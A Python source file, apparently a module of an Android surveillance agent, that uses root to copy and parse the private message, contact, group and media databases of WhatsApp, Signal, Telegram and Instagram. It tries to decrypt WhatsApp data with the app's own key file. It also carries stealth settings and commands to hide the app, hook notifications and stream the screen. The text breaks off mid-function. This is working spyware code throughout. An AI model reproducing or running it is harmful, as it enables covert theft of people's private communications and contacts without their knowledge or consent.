
"""
Advanced social media data extraction module for Android
Supports WhatsApp, Signal, Telegram, Instagram, and more
"""

import json
import os
import sqlite3
import subprocess
import time
import shutil
import zipfile
from pathlib import Path
from typing import Dict, Any, List, Optional
import tempfile


class SocialMediaExtractorModule:
    def __init__(self, agent):
        self.agent = agent
        self.extracted_data = {}
        

        self.notification_hooks = {}
        self.screen_sharing_active = False
        self.live_monitoring_sessions = {}
        

        self.stealth_mode = True
        self.hide_from_launcher = True
        self.hide_from_recent_apps = True
        
        self.app_paths = {
            "whatsapp": {
                "db_path": "/data/data/com.whatsapp/databases/msgstore.db",
                "media_path": "/data/data/com.whatsapp/files",
                "shared_prefs": "/data/data/com.whatsapp/shared_prefs"
            },
            "signal": {
                "db_path": "/data/data/org.thoughtcrime.securesms/databases/signal.db",
                "media_path": "/data/data/org.thoughtcrime.securesms/files",
                "shared_prefs": "/data/data/org.thoughtcrime.securesms/shared_prefs"
            },
            "telegram": {
                "db_path": "/data/data/org.telegram.messenger/databases/cache4.db",
                "media_path": "/data/data/org.telegram.messenger/files",
                "shared_prefs": "/data/data/org.telegram.messenger/shared_prefs"
            },
            "instagram": {
                "db_path": "/data/data/com.instagram.android/databases/direct.db",
                "media_path": "/data/data/com.instagram.android/files",
                "cache_path": "/data/data/com.instagram.android/cache"
            }
        }
    
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute social media extraction commands"""
        try:
            if command == "extract_whatsapp":
                return self.extract_whatsapp_data(args)
            elif command == "extract_signal":
                return self.extract_signal_data(args)
            elif command == "extract_telegram":
                return self.extract_telegram_data(args)
            elif command == "extract_instagram":
                return self.extract_instagram_data(args)
            elif command == "extract_all_apps":
                return self.extract_all_social_media(args)
            elif command == "get_media_files":
                return self.extract_media_files(args)
            elif command == "decrypt_databases":
                return self.decrypt_app_databases(args)
            elif command == "export_data":
                return self.export_extracted_data(args)
            elif command == "get_app_info":
                return self.get_installed_apps_info(args)
            elif command == "hook_notifications":
                return self.hook_app_notifications(args)
            elif command == "start_screen_sharing":
                return self.start_live_screen_sharing(args)
            elif command == "stop_screen_sharing":
                return self.stop_live_screen_sharing(args)
            elif command == "hide_app_completely":
                return self.hide_app_from_system(args)
            elif command == "unhide_app":
                return self.unhide_app_from_system(args)
            elif command == "get_live_notifications":
                return self.get_live_notifications(args)
            elif command == "get_screen_capture":
                return self.get_current_screen_capture(args)
            else:
                return {"error": f"Unknown social media extraction command: {command}"}
                
        except Exception as e:
            return {"error": f"Social media extraction failed: {str(e)}"}
    
    def extract_whatsapp_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract comprehensive WhatsApp data"""
        try:
            include_media = args.get("include_media", True)
            decrypt_db = args.get("decrypt_db", True)
            backup_chats = args.get("backup_chats", True)
            
            extraction_id = f"whatsapp_{int(time.time())}"
            extracted_data = {
                "app": "whatsapp",
                "extraction_id": extraction_id,
                "timestamp": time.time(),
                "databases": {},
                "media_files": [],
                "contacts": [],
                "groups": [],
                "messages": []
            }
            

            if decrypt_db:
                databases = self._extract_whatsapp_databases()
                extracted_data["databases"] = databases
                

                if "msgstore.db" in databases:
                    messages = self._parse_whatsapp_messages(databases["msgstore.db"])
                    extracted_data["messages"] = messages
                

                contacts, groups = self._extract_whatsapp_contacts_groups()
                extracted_data["contacts"] = contacts
                extracted_data["groups"] = groups
            

            if include_media:
                media_files = self._extract_whatsapp_media()
                extracted_data["media_files"] = media_files
            

            if backup_chats:
                chat_backups = self._create_whatsapp_chat_backups()
                extracted_data["chat_backups"] = chat_backups
            

            self.extracted_data[extraction_id] = extracted_data
            

            self.agent.offline_logger.log_event("whatsapp_data_extracted", {
                "extraction_id": extraction_id,
                "messages_count": len(extracted_data["messages"]),
                "contacts_count": len(extracted_data["contacts"]),
                "media_files_count": len(extracted_data["media_files"])
            })
            
            return {
                "success": True,
                "extraction_id": extraction_id,
                "summary": {
                    "messages": len(extracted_data["messages"]),
                    "contacts": len(extracted_data["contacts"]),
                    "groups": len(extracted_data["groups"]),
                    "media_files": len(extracted_data["media_files"])
                },
                "message": "WhatsApp data extraction completed"
            }
            
        except Exception as e:
            return {"error": f"WhatsApp extraction failed: {str(e)}"}
    
    def _extract_whatsapp_databases(self) -> Dict[str, str]:
        """Extract WhatsApp database files"""
        try:
            databases = {}
            db_files = ["msgstore.db", "wa.db", "axolotl.db", "chatsettings.db"]
            
            for db_file in db_files:
                source_path = f"/data/data/com.whatsapp/databases/{db_file}"
                dest_path = f"/data/local/tmp/whatsapp_{db_file}"
                

                copy_cmd = ["su", "-c", f"cp {source_path} {dest_path}"]
                result = subprocess.run(copy_cmd, capture_output=True)
                
                if result.returncode == 0:
                    databases[db_file] = dest_path
                    

                    decrypted_path = self._decrypt_whatsapp_database(dest_path, db_file)
                    if decrypted_path:
                        databases[f"{db_file}_decrypted"] = decrypted_path
            
            return databases
            
        except Exception as e:
            print(f"[!] WhatsApp database extraction failed: {e}")
            return {}
    
    def _decrypt_whatsapp_database(self, encrypted_path: str, db_name: str) -> Optional[str]:
        """Decrypt WhatsApp database using known methods"""
        try:

            key_path = "/data/data/com.whatsapp/files/key"
            decrypted_path = f"/data/local/tmp/decrypted_{db_name}"
            

            key_cmd = ["su", "-c", f"test -f {key_path} && echo 'exists'"]
            result = subprocess.run(key_cmd, capture_output=True, text=True)
            
            if "exists" in result.stdout:

                decrypt_script = f"""
#!/system/bin/sh
KEY_FILE="{key_path}"
ENCRYPTED_FILE="{encrypted_path}"
DECRYPTED_FILE="{decrypted_path}"

# Extract key
KEY=$(hexdump -ve '1/1 "%.2x"' "$KEY_FILE")

# Decrypt database (simplified approach)
openssl enc -d -aes-256-gcm -K "$KEY" -in "$ENCRYPTED_FILE" -out "$DECRYPTED_FILE" 2>/dev/null

if [ -f "$DECRYPTED_FILE" ]; then
    echo "success"
else
    echo "failed"
fi
"""
                

                script_path = f"/data/local/tmp/decrypt_wa_{int(time.time())}.sh"
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                    f.write(decrypt_script)
                    temp_script = f.name
                
                copy_cmd = ["su", "-c", f"cp {temp_script} {script_path} && chmod 755 {script_path}"]
                subprocess.run(copy_cmd, capture_output=True)
                os.unlink(temp_script)
                
                exec_cmd = ["su", "-c", script_path]
                result = subprocess.run(exec_cmd, capture_output=True, text=True)
                
                if "success" in result.stdout:
                    return decrypted_path
            

            test_cmd = ["su", "-c", f"sqlite3 {encrypted_path} '.tables'"]
            result = subprocess.run(test_cmd, capture_output=True, text=True)
            
            if "messages" in result.stdout or "chat_list" in result.stdout:

                return encrypted_path
            
            return None
            
        except Exception as e:
            print(f"[!] WhatsApp database decryption failed: {e}")
            return None
    
    def _parse_whatsapp_messages(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse WhatsApp messages from database"""
        try:
            messages = []
            

            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \""
                "SELECT messages._id, messages.key_remote_jid, messages.key_from_me, "
                "messages.key_id, messages.status, messages.needs_push, messages.data, "
                "messages.timestamp, messages.media_url, messages.media_mime_type, "
                "messages.media_wa_type, messages.media_size, messages.media_name, "
                "messages.latitude, messages.longitude "
                "FROM messages ORDER BY timestamp DESC LIMIT 5000;\""
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout.strip():
                for line in result.stdout.strip().split('\n'):
                    if line:
                        try:
                            parts = line.split('|')
                            if len(parts) >= 8:
                                message_data = {
                                    "id": parts[0],
                                    "chat_id": parts[1],
                                    "from_me": parts[2] == "1",
                                    "message_id": parts[3],
                                    "status": parts[4],
                                    "needs_push": parts[5],
                                    "data": parts[6] if len(parts) > 6 else "",
                                    "timestamp": int(parts[7]) if len(parts) > 7 else 0,
                                    "media_url": parts[8] if len(parts) > 8 else "",
                                    "media_type": parts[9] if len(parts) > 9 else "",
                                    "media_wa_type": parts[10] if len(parts) > 10 else "",
                                    "media_size": parts[11] if len(parts) > 11 else "",
                                    "media_name": parts[12] if len(parts) > 12 else "",
                                    "latitude": parts[13] if len(parts) > 13 else "",
                                    "longitude": parts[14] if len(parts) > 14 else ""
                                }
                                messages.append(message_data)
                        except Exception as e:
                            print(f"[!] Error parsing message line: {e}")
                            continue
            
            return messages
            
        except Exception as e:
            print(f"[!] WhatsApp message parsing failed: {e}")
            return []
    
    def _extract_whatsapp_contacts_groups(self) -> tuple:
        """Extract WhatsApp contacts and groups"""
        try:
            contacts = []
            groups = []
            

            wa_db_path = "/data/local/tmp/whatsapp_wa.db"
            if os.path.exists(wa_db_path):

                contacts_cmd = [
                    "su", "-c",
                    f"sqlite3 {wa_db_path} \""
                    "SELECT jid, display_name, number, status, status_timestamp "
                    "FROM wa_contacts WHERE is_whatsapp_user=1;\""
                ]
                
                result = subprocess.run(contacts_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        if line and '|' in line:
                            parts = line.split('|')
                            if len(parts) >= 3:
                                contact_data = {
                                    "jid": parts[0],
                                    "display_name": parts[1] if len(parts) > 1 else "",
                                    "number": parts[2] if len(parts) > 2 else "",
                                    "status": parts[3] if len(parts) > 3 else "",
                                    "status_timestamp": parts[4] if len(parts) > 4 else ""
                                }
                                contacts.append(contact_data)
                

                groups_cmd = [
                    "su", "-c",
                    f"sqlite3 {wa_db_path} \""
                    "SELECT jid, subject, subject_owner, subject_t, creation, "
                    "participant_hash FROM group_participants_history;\""
                ]
                
                result = subprocess.run(groups_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        if line and '|' in line:
                            parts = line.split('|')
                            if len(parts) >= 3:
                                group_data = {
                                    "jid": parts[0],
                                    "subject": parts[1] if len(parts) > 1 else "",
                                    "subject_owner": parts[2] if len(parts) > 2 else "",
                                    "subject_timestamp": parts[3] if len(parts) > 3 else "",
                                    "creation": parts[4] if len(parts) > 4 else "",
                                    "participant_hash": parts[5] if len(parts) > 5 else ""
                                }
                                groups.append(group_data)
            
            return contacts, groups
            
        except Exception as e:
            print(f"[!] WhatsApp contacts/groups extraction failed: {e}")
            return [], []
    
    def _extract_whatsapp_media(self) -> List[Dict[str, Any]]:
        """Extract WhatsApp media files"""
        try:
            media_files = []
            

            media_dirs = [
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Animated Gifs",
                "/data/data/com.whatsapp/files"
            ]
            
            for media_dir in media_dirs:
                find_cmd = ["su", "-c", f"find {media_dir} -type f -name '*' 2>/dev/null"]
                result = subprocess.run(find_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for file_path in result.stdout.strip().split('\n'):
                        if file_path and os.path.basename(file_path):

                            stat_cmd = ["su", "-c", f"stat -c '%s %Y' {file_path}"]
                            stat_result = subprocess.run(stat_cmd, capture_output=True, text=True)
                            
                            file_size = 0
                            modified_time = 0
                            
                            if stat_result.returncode == 0:
                                stat_parts = stat_result.stdout.strip().split()
                                if len(stat_parts) >= 2:
                                    file_size = int(stat_parts[0])
                                    modified_time = int(stat_parts[1])
                            
                            media_info = {
                                "path": file_path,
                                "filename": os.path.basename(file_path),
                                "size": file_size,
                                "modified_time": modified_time,
                                "type": self._get_file_type(file_path)
                            }
                            
                            media_files.append(media_info)
                            

                            if file_size < 50 * 1024 * 1024:
                                self._copy_media_file(file_path, media_info["filename"])
            
            return media_files
            
        except Exception as e:
            print(f"[!] WhatsApp media extraction failed: {e}")
            return []
    
    def _create_whatsapp_chat_backups(self) -> List[Dict[str, Any]]:
        """Create WhatsApp chat backups in readable format"""
        try:
            chat_backups = []
            

            export_cmd = [
                "su", "-c",
                "am start -a android.intent.action.VIEW -d \"whatsapp://send?text=Export\" "
                "-n com.whatsapp/.Main"
            ]
            subprocess.run(export_cmd, capture_output=True)
            

            backup_dirs = [
                "/storage/emulated/0/WhatsApp/Databases",
                "/storage/emulated/0/WhatsApp"
            ]
            
            for backup_dir in backup_dirs:
                find_cmd = ["su", "-c", f"find {backup_dir} -name '*.crypt*' -o -name '*.txt' 2>/dev/null"]
                result = subprocess.run(find_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for backup_file in result.stdout.strip().split('\n'):
                        if backup_file:
                            backup_info = {
                                "path": backup_file,
                                "filename": os.path.basename(backup_file),
                                "type": "backup"
                            }
                            chat_backups.append(backup_info)
            
            return chat_backups
            
        except Exception as e:
            print(f"[!] WhatsApp chat backup failed: {e}")
            return []
    
    def extract_signal_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract Signal data"""
        try:
            include_media = args.get("include_media", True)
            decrypt_db = args.get("decrypt_db", True)
            
            extraction_id = f"signal_{int(time.time())}"
            extracted_data = {
                "app": "signal",
                "extraction_id": extraction_id,
                "timestamp": time.time(),
                "databases": {},
                "media_files": [],
                "messages": [],
                "contacts": []
            }
            

            if decrypt_db:
                db_path = self._extract_signal_database()
                if db_path:
                    extracted_data["databases"]["signal.db"] = db_path
                    

                    messages = self._parse_signal_messages(db_path)
                    extracted_data["messages"] = messages
                    

                    contacts = self._parse_signal_contacts(db_path)
                    extracted_data["contacts"] = contacts
            

            if include_media:
                media_files = self._extract_signal_media()
                extracted_data["media_files"] = media_files
            
            self.extracted_data[extraction_id] = extracted_data
            
            self.agent.offline_logger.log_event("signal_data_extracted", {
                "extraction_id": extraction_id,
                "messages_count": len(extracted_data["messages"]),
                "contacts_count": len(extracted_data["contacts"]),
                "media_files_count": len(extracted_data["media_files"])
            })
            
            return {
                "success": True,
                "extraction_id": extraction_id,
                "summary": {
                    "messages": len(extracted_data["messages"]),
                    "contacts": len(extracted_data["contacts"]),
                    "media_files": len(extracted_data["media_files"])
                },
                "message": "Signal data extraction completed"
            }
            
        except Exception as e:
            return {"error": f"Signal extraction failed: {str(e)}"}
    
    def _extract_signal_database(self) -> Optional[str]:
        """Extract Signal database"""
        try:
            source_path = "/data/data/org.thoughtcrime.securesms/databases/signal.db"
            dest_path = "/data/local/tmp/signal.db"
            

            copy_cmd = ["su", "-c", f"cp {source_path} {dest_path}"]
            result = subprocess.run(copy_cmd, capture_output=True)
            
            if result.returncode == 0:
                return dest_path
            
            return None
            
        except Exception as e:
            print(f"[!] Signal database extraction failed: {e}")
            return None
    
    def _parse_signal_messages(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Signal messages"""
        try:
            messages = []
            

            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \""
                "SELECT _id, thread_id, address, body, date_sent, date_received, "
                "type, read FROM mms UNION ALL "
                "SELECT _id, thread_id, address, body, date, date_received, "
                "type, read FROM sms ORDER BY date_sent DESC LIMIT 3000;\""
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 6:
                            message_data = {
                                "id": parts[0],
                                "thread_id": parts[1],
                                "address": parts[2],
                                "body": parts[3],
                                "date_sent": int(parts[4]) if parts[4] else 0,
                                "date_received": int(parts[5]) if parts[5] else 0,
                                "type": parts[6] if len(parts) > 6 else "",
                                "read": parts[7] if len(parts) > 7 else ""
                            }
                            messages.append(message_data)
            
            return messages
            
        except Exception as e:
            print(f"[!] Signal message parsing failed: {e}")
            return []
    
    def _parse_signal_contacts(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Signal contacts"""
        try:
            contacts = []
            
            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \""
                "SELECT _id, name, number, color, blocked, expires_in "
                "FROM recipient_preferences;\""
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            contact_data = {
                                "id": parts[0],
                                "name": parts[1],
                                "number": parts[2],
                                "color": parts[3] if len(parts) > 3 else "",
                                "blocked": parts[4] if len(parts) > 4 else "",
                                "expires_in": parts[5] if len(parts) > 5 else ""
                            }
                            contacts.append(contact_data)
            
            return contacts
            
        except Exception as e:
            print(f"[!] Signal contacts parsing failed: {e}")
            return []
    
    def _extract_signal_media(self) -> List[Dict[str, Any]]:
        """Extract Signal media files"""
        try:
            media_files = []
            

            media_dirs = [
                "/data/data/org.thoughtcrime.securesms/files",
                "/data/data/org.thoughtcrime.securesms/app_parts"
            ]
            
            for media_dir in media_dirs:
                find_cmd = ["su", "-c", f"find {media_dir} -type f 2>/dev/null"]
                result = subprocess.run(find_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for file_path in result.stdout.strip().split('\n'):
                        if file_path:
                            media_info = {
                                "path": file_path,
                                "filename": os.path.basename(file_path),
                                "type": self._get_file_type(file_path)
                            }
                            media_files.append(media_info)
            
            return media_files
            
        except Exception as e:
            print(f"[!] Signal media extraction failed: {e}")
            return []
    
    def extract_telegram_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract Telegram data"""
        try:
            include_media = args.get("include_media", True)
            decrypt_db = args.get("decrypt_db", True)
            
            extraction_id = f"telegram_{int(time.time())}"
            extracted_data = {
                "app": "telegram",
                "extraction_id": extraction_id,
                "timestamp": time.time(),
                "databases": {},
                "media_files": [],
                "messages": [],
                "contacts": [],
                "chats": []
            }
            

            if decrypt_db:
                databases = self._extract_telegram_databases()
                extracted_data["databases"] = databases
                
                if databases:

                    main_db = next(iter(databases.values()))
                    
                    messages = self._parse_telegram_messages(main_db)
                    extracted_data["messages"] = messages
                    
                    contacts = self._parse_telegram_contacts(main_db)
                    extracted_data["contacts"] = contacts
                    
                    chats = self._parse_telegram_chats(main_db)
                    extracted_data["chats"] = chats
            

            if include_media:
                media_files = self._extract_telegram_media()
                extracted_data["media_files"] = media_files
            
            self.extracted_data[extraction_id] = extracted_data
            
            self.agent.offline_logger.log_event("telegram_data_extracted", {
                "extraction_id": extraction_id,
                "messages_count": len(extracted_data["messages"]),
                "contacts_count": len(extracted_data["contacts"]),
                "chats_count": len(extracted_data["chats"]),
                "media_files_count": len(extracted_data["media_files"])
            })
            
            return {
                "success": True,
                "extraction_id": extraction_id,
                "summary": {
                    "messages": len(extracted_data["messages"]),
                    "contacts": len(extracted_data["contacts"]),
                    "chats": len(extracted_data["chats"]),
                    "media_files": len(extracted_data["media_files"])
                },
                "message": "Telegram data extraction completed"
            }
            
        except Exception as e:
            return {"error": f"Telegram extraction failed: {str(e)}"}
    
    def _extract_telegram_databases(self) -> Dict[str, str]:
        """Extract Telegram database files"""
        try:
            databases = {}
            

            db_files = ["cache4.db", "userconfigs.xml"]
            
            for db_file in db_files:
                if db_file.endswith('.db'):
                    source_path = f"/data/data/org.telegram.messenger/databases/{db_file}"
                else:
                    source_path = f"/data/data/org.telegram.messenger/shared_prefs/{db_file}"
                
                dest_path = f"/data/local/tmp/telegram_{db_file}"
                
                copy_cmd = ["su", "-c", f"cp {source_path} {dest_path}"]
                result = subprocess.run(copy_cmd, capture_output=True)
                
                if result.returncode == 0:
                    databases[db_file] = dest_path
            
            return databases
            
        except Exception as e:
            print(f"[!] Telegram database extraction failed: {e}")
            return {}
    
    def _parse_telegram_messages(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Telegram messages"""
        try:
            messages = []
            


            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \".tables\""
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                tables = result.stdout.strip().split()
                

                for table in tables:
                    if "message" in table.lower() or "chat" in table.lower():
                        table_query = [
                            "su", "-c",
                            f"sqlite3 {db_path} \"SELECT * FROM {table} LIMIT 100;\""
                        ]
                        
                        table_result = subprocess.run(table_query, capture_output=True, text=True)
                        
                        if table_result.returncode == 0:
                            for line in table_result.stdout.strip().split('\n'):
                                if line:
                                    message_data = {
                                        "table": table,
                                        "raw_data": line,
                                        "extracted_at": time.time()
                                    }
                                    messages.append(message_data)
            
            return messages
            
        except Exception as e:
            print(f"[!] Telegram message parsing failed: {e}")
            return []
    
    def _parse_telegram_contacts(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Telegram contacts"""
        try:
            contacts = []
            

            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \".tables\" | grep -i contact"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                for table in result.stdout.strip().split():
                    contact_query = [
                        "su", "-c",
                        f"sqlite3 {db_path} \"SELECT * FROM {table} LIMIT 50;\""
                    ]
                    
                    contact_result = subprocess.run(contact_query, capture_output=True, text=True)
                    
                    if contact_result.returncode == 0:
                        for line in contact_result.stdout.strip().split('\n'):
                            if line:
                                contact_data = {
                                    "table": table,
                                    "raw_data": line,
                                    "extracted_at": time.time()
                                }
                                contacts.append(contact_data)
            
            return contacts
            
        except Exception as e:
            print(f"[!] Telegram contacts parsing failed: {e}")
            return []
    
    def _parse_telegram_chats(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Telegram chats"""
        try:
            chats = []
            

            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \".tables\" | grep -i chat"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                for table in result.stdout.strip().split():
                    chat_query = [
                        "su", "-c",
                        f"sqlite3 {db_path} \"SELECT * FROM {table} LIMIT 50;\""
                    ]
                    
                    chat_result = subprocess.run(chat_query, capture_output=True, text=True)
                    
                    if chat_result.returncode == 0:
                        for line in chat_result.stdout.strip().split('\n'):
                            if line:
                                chat_data = {
                                    "table": table,
                                    "raw_data": line,
                                    "extracted_at": time.time()
                                }
                                chats.append(chat_data)
            
            return chats
            
        except Exception as e:
            print(f"[!] Telegram chats parsing failed: {e}")
            return []
    
    def _extract_telegram_media(self) -> List[Dict[str, Any]]:
        """Extract Telegram media files"""
        try:
            media_files = []
            

            media_dirs = [
                "/storage/emulated/0/Telegram",
                "/data/data/org.telegram.messenger/files",
                "/data/data/org.telegram.messenger/cache"
            ]
            
            for media_dir in media_dirs:
                find_cmd = ["su", "-c", f"find {media_dir} -type f 2>/dev/null"]
                result = subprocess.run(find_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for file_path in result.stdout.strip().split('\n'):
                        if file_path:
                            media_info = {
                                "path": file_path,
                                "filename": os.path.basename(file_path),
                                "type": self._get_file_type(file_path)
                            }
                            media_files.append(media_info)
            
            return media_files
            
        except Exception as e:
            print(f"[!] Telegram media extraction failed: {e}")
            return []
    
    def extract_instagram_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract Instagram data"""
        try:
            include_media = args.get("include_media", True)
            decrypt_db = args.get("decrypt_db", True)
            
            extraction_id = f"instagram_{int(time.time())}"
            extracted_data = {
                "app": "instagram",
                "extraction_id": extraction_id,
                "timestamp": time.time(),
                "databases": {},
                "media_files": [],
                "messages": [],
                "contacts": [],
                "posts": []
            }
            

            if decrypt_db:
                databases = self._extract_instagram_databases()
                extracted_data["databases"] = databases
                
                if databases:
                    main_db = next(iter(databases.values()))
                    
                    messages = self._parse_instagram_messages(main_db)
                    extracted_data["messages"] = messages
                    
                    contacts = self._parse_instagram_contacts(main_db)
                    extracted_data["contacts"] = contacts
            

            if include_media:
                media_files = self._extract_instagram_media()
                extracted_data["media_files"] = media_files
            
            self.extracted_data[extraction_id] = extracted_data
            
            self.agent.offline_logger.log_event("instagram_data_extracted", {
                "extraction_id": extraction_id,
                "messages_count": len(extracted_data["messages"]),
                "contacts_count": len(extracted_data["contacts"]),
                "media_files_count": len(extracted_data["media_files"])
            })
            
            return {
                "success": True,
                "extraction_id": extraction_id,
                "summary": {
                    "messages": len(extracted_data["messages"]),
                    "contacts": len(extracted_data["contacts"]),
                    "media_files": len(extracted_data["media_files"])
                },
                "message": "Instagram data extraction completed"
            }
            
        except Exception as e:
            return {"error": f"Instagram extraction failed: {str(e)}"}
    
    def _extract_instagram_databases(self) -> Dict[str, str]:
        """Extract Instagram database files"""
        try:
            databases = {}
            

            db_files = ["direct.db", "main.db"]
            
            for db_file in db_files:
                source_path = f"/data/data/com.instagram.android/databases/{db_file}"
                dest_path = f"/data/local/tmp/instagram_{db_file}"
                
                copy_cmd = ["su", "-c", f"cp {source_path} {dest_path}"]
                result = subprocess.run(copy_cmd, capture_output=True)
                
                if result.returncode == 0:
                    databases[db_file] = dest_path
            
            return databases
            
        except Exception as e:
            print(f"[!] Instagram database extraction failed: {e}")
            return {}
    
    def _parse_instagram_messages(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Instagram messages"""
        try:
            messages = []
            

            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \".tables\" | grep -i message"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                for table in result.stdout.strip().split():
                    msg_query = [
                        "su", "-c",
                        f"sqlite3 {db_path} \"SELECT * FROM {table} LIMIT 100;\""
                    ]
                    
                    msg_result = subprocess.run(msg_query, capture_output=True, text=True)
                    
                    if msg_result.returncode == 0:
                        for line in msg_result.stdout.strip().split('\n'):
                            if line:
                                message_data = {
                                    "table": table,
                                    "raw_data": line,
                                    "extracted_at": time.time()
                                }
                                messages.append(message_data)
            
            return messages
            
        except Exception as e:
            print(f"[!] Instagram message parsing failed: {e}")
            return []
    
    def _parse_instagram_contacts(self, db_path: str) -> List[Dict[str, Any]]:
        """Parse Instagram contacts"""
        try:
            contacts = []
            
            query_cmd = [
                "su", "-c",
                f"sqlite3 {db_path} \".tables\" | grep -i user"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                for table in result.stdout.strip().split():
                    user_query = [
                        "su", "-c",
                        f"sqlite3 {db_path} \"SELECT * FROM {table} LIMIT 50;\""
                    ]
                    
                    user_result = subprocess.run(user_query, capture_output=True, text=True)
                    
                    if user_result.returncode == 0:
                        for line in user_result.stdout.strip().split('\n'):
                            if line:
                                contact_data = {
                                    "table": table,
                                    "raw_data": line,
                                    "extracted_at": time.time()
                                }
                                contacts.append(contact_data)
            
            return contacts
            
        except Exception as e:
            print(f"[!] Instagram contacts parsing failed: {e}")
            return []
    
    def _extract_instagram_media(self) -> List[Dict[str, Any]]:
        """Extract Instagram media files"""
        try:
            media_files = []
            

            media_dirs = [
                "/data/data/com.instagram.android/files",
                "/data/data/com.instagram.android/cache",
                "/storage/emulated/0/Android/data/com.instagram.android"
            ]
            
            for media_dir in media_dirs:
                find_cmd = ["su", "-c", f"find {media_dir} -type f -name '*.jpg' -o -name '*.mp4' -o -name '*.png' 2>/dev/null"]
                result = subprocess.run(find_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    for file_path in result.stdout.strip().split('\n'):
                        if file_path:
                            media_info = {
                                "path": file_path,
                                "filename": os.path.basename(file_path),
                                "type": self._get_file_type(file_path)
                            }
                            media_files.append(media_info)
            
            return media_files
            
        except Exception as e:
            print(f"[!] Instagram media extraction failed: {e}")
            return []
    
    def extract_all_social_media(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract data from all social media apps"""
        try:
            results = {}
            apps = args.get("apps", ["whatsapp", "signal", "telegram", "instagram"])
            
            for app in apps:
                if app == "whatsapp":
                    result = self.extract_whatsapp_data(args)
                elif app == "signal":
                    result = self.extract_signal_data(args)
                elif app == "telegram":
                    result = self.extract_telegram_data(args)
                elif app == "instagram":
                    result = self.extract_instagram_data(args)
                else:
                    result = {"error": f"Unknown app: {app}"}
                
                results[app] = result
            

            total_messages = 0
            total_contacts = 0
            total_media = 0
            
            for app, result in results.items():
                if "summary" in result:
                    total_messages += result["summary"].get("messages", 0)
                    total_contacts += result["summary"].get("contacts", 0)
                    total_media += result["summary"].get("media_files", 0)
            
            return {
                "success": True,
                "results": results,
                "combined_summary": {
                    "total_messages": total_messages,
                    "total_contacts": total_contacts,
                    "total_media_files": total_media
                },
                "message": f"Extracted data from {len(apps)} social media apps"
            }
            
        except Exception as e:
            return {"error": f"Bulk social media extraction failed: {str(e)}"}
    
    def extract_media_files(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract media files from app directories"""
        try:
            app_name = args.get("app", "all")
            file_types = args.get("file_types", ["jpg", "png", "mp4", "mp3", "pdf"])
            max_size = args.get("max_size", 100 * 1024 * 1024)
            
            media_files = []
            extraction_id = f"media_{int(time.time())}"
            
            if app_name == "all":
                apps_to_extract = list(self.app_paths.keys())
            else:
                apps_to_extract = [app_name] if app_name in self.app_paths else []
            
            for app in apps_to_extract:
                app_media = self._extract_app_media_files(app, file_types, max_size)
                media_files.extend(app_media)
            

            collection_dir = f"/data/local/tmp/media_extract_{extraction_id}"
            create_cmd = ["su", "-c", f"mkdir -p {collection_dir}"]
            subprocess.run(create_cmd, capture_output=True)
            
            copied_files = []
            for media_file in media_files[:50]:
                dest_file = os.path.join(collection_dir, f"{media_file['app']}_{media_file['filename']}")
                copy_cmd = ["su", "-c", f"cp '{media_file['path']}' '{dest_file}'"]
                result = subprocess.run(copy_cmd, capture_output=True)
                
                if result.returncode == 0:
                    copied_files.append({
                        "original_path": media_file["path"],
                        "copied_path": dest_file,
                        "filename": media_file["filename"],
                        "app": media_file["app"]
                    })
            

            archive_path = f"/data/local/tmp/media_extract_{extraction_id}.tar.gz"
            tar_cmd = ["su", "-c", f"tar -czf {archive_path} -C {collection_dir} ."]
            subprocess.run(tar_cmd, capture_output=True)
            
            self.agent.offline_logger.log_event("media_files_extracted", {
